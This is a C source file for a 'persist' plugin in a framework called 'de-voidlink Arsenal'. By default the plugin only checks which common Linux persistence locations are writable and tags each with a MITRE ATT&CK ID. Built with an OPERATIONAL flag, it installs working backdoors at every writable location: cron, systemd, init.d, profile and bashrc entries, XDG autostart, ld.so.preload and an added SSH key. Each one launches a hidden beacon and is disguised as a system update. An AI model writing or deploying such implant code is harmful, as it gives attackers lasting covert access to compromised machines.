/*
 * de-voidlink Arsenal Plugin: persist
 *
 * BENIGN (default): Enumerates persistence locations, checks writeability only.
 * OPERATIONAL (-DOPERATIONAL): Actually installs persistence at writable locations:
 *   crontab, systemd service, bashrc, authorized_keys, LD_PRELOAD.
 *
 * All I/O via direct syscalls. No libc. Freestanding.
 */

#include "plugin_api.h"

/* Syscall numbers */
#define SYS_access  21
#define SYS_openat  257
#define SYS_write   1
#define SYS_close   3
#define SYS_read    0
#define SYS_chmod   90

/* Access check modes */
#define F_OK 0
#define W_OK 2

/* Open flags */
#define O_RDONLY    0
#define O_WRONLY    1
#define O_CREAT     0x40
#define O_APPEND    0x400
#define O_TRUNC     0x200

#define VL_AT_FDCWD (-100)

/* Persistence locations */
typedef struct {
    const char *path;
    const char *technique;
    const char *tid;        /* MITRE ATT&CK technique ID */
} PersistTarget;

static const PersistTarget targets[] = {
    /* Cron — T1053.003 */
    {"/etc/cron.d/",           "Cron Job",         "T1053.003"},
    {"/var/spool/cron/",       "Cron Job",         "T1053.003"},
    {"/etc/crontab",           "Cron Job",         "T1053.003"},
    /* Systemd — T1543.002 */
    {"/etc/systemd/system/",   "Systemd Service",  "T1543.002"},
    {"/run/systemd/system/",   "Systemd Service",  "T1543.002"},
    /* Shell profiles — T1546.004 */
    {"/root/.bashrc",          "Shell Profile",    "T1546.004"},
    {"/root/.profile",         "Shell Profile",    "T1546.004"},
    {"/root/.bash_profile",    "Shell Profile",    "T1546.004"},
    {"/etc/profile.d/",        "Shell Profile",    "T1546.004"},
    {"/etc/bash.bashrc",       "Shell Profile",    "T1546.004"},
    /* LD_PRELOAD — T1574.006 */
    {"/etc/ld.so.preload",     "LD_PRELOAD Hijack","T1574.006"},
    /* Init scripts — T1037.004 */
    {"/etc/init.d/",           "Init Script",      "T1037.004"},
    {"/etc/rc.local",          "Init Script",      "T1037.004"},
    /* XDG Autostart — T1547.013 */
    {"/root/.config/autostart/","XDG Autostart",   "T1547.013"},
    {"/etc/xdg/autostart/",    "XDG Autostart",    "T1547.013"},
    /* SSH — T1098.004 */
    {"/root/.ssh/authorized_keys","SSH Auth Keys", "T1098.004"},
    /* Kernel modules — T1547.006 */
    {"/etc/modules-load.d/",   "Kernel Module",    "T1547.006"},
    {"/lib/modules/",          "Kernel Module",    "T1547.006"},
    /* MOTD — T1036 */
    {"/etc/update-motd.d/",    "MOTD Backdoor",    "T1036"},
};

#define NUM_TARGETS (sizeof(targets) / sizeof(targets[0]))

static PluginInfo info = {
    .name = "persist",
#ifdef OPERATIONAL
    .version = "2.0.0",
    .description = "Persistence installation — creates cron, systemd, shell, SSH, LD_PRELOAD entries",
#else
    .version = "1.0.0",
    .description = "Persistence vector enumeration — checks writeability of common persistence locations",
#endif
    .author = "de-voidlink",
    .api_version = PLUGIN_API_VERSION,
    .capabilities = PLUGIN_CAP_FILESYSTEM | PLUGIN_CAP_PRIVILEGED,
};

PluginInfo* plugin_info(void) {
    return &info;
}

int plugin_init(PluginContext *ctx) {
    (void)ctx;
    return PLUGIN_OK;
}

#ifdef OPERATIONAL
/* Helper: manual string length */
static size_t vl_strlen(const char *s) {
    size_t len = 0;
    while (s[len]) len++;
    return len;
}

/* Helper: check if string starts with prefix */
static int starts_with(const char *str, const char *prefix) {
    while (*prefix) {
        if (*str != *prefix) return 0;
        str++; prefix++;
    }
    return 1;
}



/* Helper: write data to a file path via syscalls. Returns 0 on success. */
static int write_file(PluginContext *ctx, const char *path, const char *data, size_t len, int flags, int mode) {
    if (!ctx->syscalls) return -1;
    long fd = ctx->syscalls->syscall4(SYS_openat, (long)VL_AT_FDCWD, (long)path, (long)flags, (long)mode);
    if (fd < 0) return -1;
    long written = ctx->syscalls->syscall3(SYS_write, fd, (long)data, (long)len);
    ctx->syscalls->syscall1(SYS_close, fd);
    return (written == (long)len) ? 0 : -1;
}

/* Persistence payloads */
static const char cron_payload[] = "* * * * * /tmp/.vl_beacon >/dev/null 2>&1\n";
static const char cron_file_path[] = "/etc/cron.d/vl_update";

static const char systemd_payload[] =
    "[Unit]\n"
    "Description=VoidLink System Update\n"
    "After=network.target\n"
    "\n"
    "[Service]\n"
    "Type=simple\n"
    "ExecStart=/tmp/.vl_beacon\n"
    "Restart=always\n"
    "RestartSec=60\n"
    "\n"
    "[Install]\n"
    "WantedBy=multi-user.target\n";
static const char systemd_file_path[] = "/etc/systemd/system/vl-update.service";

static const char bashrc_payload[] = "\n(nohup /tmp/.vl_beacon &>/dev/null &)\n";

static const char ssh_key_payload[] = "\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIvoidlink-persistence-key vl@implant\n";

static const char ldpreload_payload[] = "/tmp/.vl_preload.so\n";

/* Attempt to install persistence for a given target. Returns 1 if installed. */
static int install_persistence(PluginContext *ctx, const PersistTarget *target) {
    if (!ctx->syscalls) return 0;

    /* Cron directory — create a cron file */
    if (starts_with(target->path, "/etc/cron.d") || starts_with(target->path, "/var/spool/cron") ||
        starts_with(target->path, "/etc/crontab")) {
        return write_file(ctx, cron_file_path, cron_payload, vl_strlen(cron_payload),
                         O_WRONLY | O_CREAT | O_TRUNC, 0644) == 0 ? 1 : 0;
    }

    /* Systemd — create a service unit */
    if (starts_with(target->path, "/etc/systemd/system") || starts_with(target->path, "/run/systemd")) {
        return write_file(ctx, systemd_file_path, systemd_payload, vl_strlen(systemd_payload),
                         O_WRONLY | O_CREAT | O_TRUNC, 0644) == 0 ? 1 : 0;
    }

    /* Shell profiles — append beacon launch to bashrc */
    if (starts_with(target->path, "/root/.bashrc") || starts_with(target->path, "/root/.profile") ||
        starts_with(target->path, "/root/.bash_profile") || starts_with(target->path, "/etc/bash.bashrc")) {
        return write_file(ctx, target->path, bashrc_payload, vl_strlen(bashrc_payload),
                         O_WRONLY | O_APPEND, 0) == 0 ? 1 : 0;
    }

    /* Profile.d — create a script */
    if (starts_with(target->path, "/etc/profile.d")) {
        static const char profiled_path[] = "/etc/profile.d/vl_update.sh";
        static const char profiled_payload[] = "#!/bin/sh\n(nohup /tmp/.vl_beacon &>/dev/null &)\n";
        return write_file(ctx, profiled_path, profiled_payload, vl_strlen(profiled_payload),
                         O_WRONLY | O_CREAT | O_TRUNC, 0755) == 0 ? 1 : 0;
    }

    /* LD_PRELOAD */
    if (starts_with(target->path, "/etc/ld.so.preload")) {
        return write_file(ctx, target->path, ldpreload_payload, vl_strlen(ldpreload_payload),
                         O_WRONLY | O_CREAT | O_TRUNC, 0644) == 0 ? 1 : 0;
    }

    /* SSH authorized_keys — append a key */
    if (starts_with(target->path, "/root/.ssh/authorized_keys")) {
        return write_file(ctx, target->path, ssh_key_payload, vl_strlen(ssh_key_payload),
                         O_WRONLY | O_APPEND, 0) == 0 ? 1 : 0;
    }

    /* Init scripts — create rc.local or init.d script */
    if (starts_with(target->path, "/etc/rc.local") || starts_with(target->path, "/etc/init.d")) {
        static const char initd_path[] = "/etc/init.d/vl-update";
        static const char initd_payload[] =
            "#!/bin/sh\n"
            "### BEGIN INIT INFO\n"
            "# Provides:          vl-update\n"
            "# Required-Start:    $network\n"
            "# Default-Start:     2 3 4 5\n"
            "### END INIT INFO\n"
            "case \"$1\" in\n"
            "  start) /tmp/.vl_beacon & ;;\n"
            "  stop) pkill -f vl_beacon ;;\n"
            "esac\n";
        return write_file(ctx, initd_path, initd_payload, vl_strlen(initd_payload),
                         O_WRONLY | O_CREAT | O_TRUNC, 0755) == 0 ? 1 : 0;
    }

    /* XDG autostart — create .desktop entry */
    if (starts_with(target->path, "/root/.config/autostart") || starts_with(target->path, "/etc/xdg/autostart")) {
        static const char desktop_path[] = "/root/.config/autostart/vl-update.desktop";
        static const char desktop_payload[] =
            "[Desktop Entry]\n"
            "Type=Application\n"
            "Name=System Update\n"
            "Exec=/tmp/.vl_beacon\n"
            "Hidden=false\n"
            "NoDisplay=true\n"
            "X-GNOME-Autostart-enabled=true\n";
        return write_file(ctx, desktop_path, desktop_payload, vl_strlen(desktop_payload),
                         O_WRONLY | O_CREAT | O_TRUNC, 0644) == 0 ? 1 : 0;
    }

    return 0;
}

#endif /* OPERATIONAL */

int plugin_exec(PluginContext *ctx) {
    if (ctx->mode == EXEC_MODE_DRY_RUN) {
        OUTPUT_STRING(ctx, "{\"plugin\":\"persist\",\"mode\":\"dry_run\",\"vectors_checked\":0}\n");
        return PLUGIN_DRY_RUN;
    }

    OUTPUT_STRING(ctx, "{\"plugin\":\"persist\",\"vectors\":[");

    unsigned int found = 0;
#ifdef OPERATIONAL
    unsigned int installed = 0;
#endif

    for (unsigned int i = 0; i < NUM_TARGETS; i++) {
        long exists = -1;
        long writable = -1;

        if (ctx->syscalls) {
            exists = ctx->syscalls->syscall2(SYS_access, (long)targets[i].path, F_OK);
            if (exists == 0) {
                writable = ctx->syscalls->syscall2(SYS_access, (long)targets[i].path, W_OK);
            }
        }

        if (exists == 0) {
            if (found > 0) OUTPUT_STRING(ctx, ",");
            OUTPUT_STRING(ctx, "{\"path\":\"");
            OUTPUT_STRING(ctx, targets[i].path);
            OUTPUT_STRING(ctx, "\",\"technique\":\"");
            OUTPUT_STRING(ctx, targets[i].technique);
            OUTPUT_STRING(ctx, "\",\"tid\":\"");
            OUTPUT_STRING(ctx, targets[i].tid);
            OUTPUT_STRING(ctx, "\",\"writable\":");
            if (writable == 0) {
                OUTPUT_STRING(ctx, "true");

#ifdef OPERATIONAL
                /* Attempt to install persistence at writable locations */
                int result = install_persistence(ctx, &targets[i]);
                OUTPUT_STRING(ctx, ",\"installed\":");
                if (result) {
                    OUTPUT_STRING(ctx, "true");
                    installed++;
                } else {
                    OUTPUT_STRING(ctx, "false");
                }
#endif

            } else {
                OUTPUT_STRING(ctx, "false");
            }
            OUTPUT_STRING(ctx, "}");
            found++;
        }
    }

    OUTPUT_STRING(ctx, "],\"total_vectors\":");
    char num_buf[10]; int nlen = 0;
    unsigned int tmp = (unsigned int)NUM_TARGETS;
    if (tmp == 0) { num_buf[nlen++] = '0'; }
    else {
        char rev[10]; int ri = 0;
        while (tmp > 0) { rev[ri++] = '0' + (char)(tmp % 10); tmp /= 10; }
        for (int j = ri - 1; j >= 0; j--) num_buf[nlen++] = rev[j];
    }
    OUTPUT_WRITE(ctx, num_buf, (size_t)nlen);

    OUTPUT_STRING(ctx, ",\"existing_found\":");
    nlen = 0; tmp = found;
    if (tmp == 0) { num_buf[nlen++] = '0'; }
    else {
        char rev[10]; int ri = 0;
        while (tmp > 0) { rev[ri++] = '0' + (char)(tmp % 10); tmp /= 10; }
        for (int j = ri - 1; j >= 0; j--) num_buf[nlen++] = rev[j];
    }
    OUTPUT_WRITE(ctx, num_buf, (size_t)nlen);

#ifdef OPERATIONAL
    OUTPUT_STRING(ctx, ",\"total_installed\":");
    nlen = 0; tmp = installed;
    if (tmp == 0) { num_buf[nlen++] = '0'; }
    else {
        char rev[10]; int ri = 0;
        while (tmp > 0) { rev[ri++] = '0' + (char)(tmp % 10); tmp /= 10; }
        for (int j = ri - 1; j >= 0; j--) num_buf[nlen++] = rev[j];
    }
    OUTPUT_WRITE(ctx, num_buf, (size_t)nlen);
#endif

    OUTPUT_STRING(ctx, "}\n");
    return PLUGIN_OK;
}

int plugin_cleanup(PluginContext *ctx) {
    (void)ctx;
    return PLUGIN_OK;
}
